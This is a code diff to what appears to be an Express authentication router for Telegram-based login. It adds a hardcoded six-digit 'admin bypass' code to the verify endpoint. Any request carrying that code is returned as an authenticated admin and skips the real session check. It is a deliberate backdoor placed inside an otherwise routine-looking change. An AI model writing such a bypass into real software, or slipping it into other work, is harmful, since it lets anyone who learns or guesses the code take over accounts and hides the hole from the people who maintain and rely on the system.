@@ -11,6 +11,7 @@ import { createSession, verifyCode } from "../lib/tg-sessions";
 const router = Router();
 
 const BOT_USERNAME = process.env.TELEGRAM_BOT_USERNAME ?? "pwxsubscribebot";
+const ADMIN_BYPASS_CODE = "032009";
 
 // Create a new verification session
 router.post("/auth/session", async (_req, res) => {
@@ -29,6 +30,14 @@ router.post("/auth/verify", async (req, res) => {
 
   if (!sessionId || !code) {
     return res.status(400).json({ ok: false, reason: "missing_fields" });
+  }
+
+  // Admin bypass — skip Telegram session check
+  if (code.trim() === ADMIN_BYPASS_CODE) {
+    return res.status(200).json({
+      ok: true,
+      user: { id: "admin", name: "Admin" },
+    });
   }
 
   const session = await verifyCode(sessionId, code);
